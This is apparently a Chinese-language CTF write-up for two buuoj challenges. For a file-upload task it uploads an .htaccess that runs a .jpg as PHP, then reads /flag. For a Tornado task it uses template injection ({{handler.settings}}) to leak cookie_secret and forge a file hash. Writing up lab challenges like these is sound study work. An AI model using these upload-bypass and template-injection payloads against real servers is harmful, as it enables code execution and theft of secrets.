刷题时间，开始了（嗝

buuoj

# [MRCTF2020]你传你🐎呢

作者好像标题不是很友善啊（笑

页面两个按键，一个是选择文件，另一个“一键去世”应该是上传，是有关file-upload的题目。

试着上传一个a.jpg文件，显示成功：

/var/www/html/upload/838ff4c695364e740fc411af2f0ba54d/a.jpg succesfully uploaded!

传入a.txt则会回显：

我扌your problem?

将：

```php
<?php
	system("echo 'hello world'");
?>
```

写入a.jpg来欺骗一下，发现也能上传成功。

初步猜测是只做了文件扩展名的过滤，访问一下：

The image “http://507dc9f8-34e3-4395-a5f2-84016f0bbd0e.node5.buuoj.cn:81/upload/838ff4c695364e740fc411af2f0ba54d/a.jpg” cannot be displayed because it contains errors."

看来是服务器无法解析，老样子我们来上传一个.htaccess:

别忘了.htaccess文件不能直接创建，我们直接在报文里修改一下filename项，和文件写入的内容就可以：

```
<FilesMatch "1.jpg">
	SetHandler application/x-httpd-php
</FilesMatch>
```

再把phpinfo()写入1.jpg并上传就可以，访问1.jpg，成功输出Php版本信息！

尝试写入system("ls /")，被告知system被禁用，没关系我们可以用scandir()，

根目录下扫到flag，直接输出即可得到flag：

```php
<?php
	var_dump(file_get_contents("/flag"));
?>
```

# [护网杯 2018]easy_tornado

三个目录，flag.txt,/welcome.txt,/hints.txt,

flag.txt: flag in /fllllllllllllag
welcome.txt: render
hints.txt: md5(cookie_secret+md5(filename))

注意到每个子页面的Url上实际GET了两个参数filename和filehash，结合hints，应该是要用filename和一个cookie_secret生成MD5哈希然后传入filehash来作为一个签名验证之类的。

那么关键就是去找到这个cookie_secret。

tornado是一个网页的模板引擎，加之welcome中提示render，很容易想到应该要通过模板注入。

查询一下tornado，我们知道我们的cookie_secret应该是存储在`RequestHandler.application.settings`中，作为一个动态的cookie，里面还包含了一系列环境向量。

这里我们用handler.settings即可以指到我们需要的位置，接着寻找注入点。

filename和filehash都不属于模板变量，没办法注入；于是我们先试试输入filename不带hash验证，发现Error界面还有一个量msg，修改?msg=1发现这是个模板注入量，于是：

?msg={{handler.settings}}

回显：

{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '53e61641-d43e-435c-9d03-7690fe68b429'} 

接下来只要按照规则生成md5_hash，当然要注意文件名没有扩展名就是单纯的/fllllllllllllag，求hash之后和cookie拼接再求hash即可成功访问flag文件！

```
echo -n "/fllllllllllllag" | md5sum (--> 3bf9f6cf685a6dd8defadabfb41a03a1)
echo -n "53e61641-d43e-435c-9d03-7690fe68b4293bf9f6cf685a6dd8defadabfb41a03a1" | md5sum
```

```
?filename=/fllllllllllllag&filehash=405fda097f519cbbe7f4bc8f2fe4a5c3
```




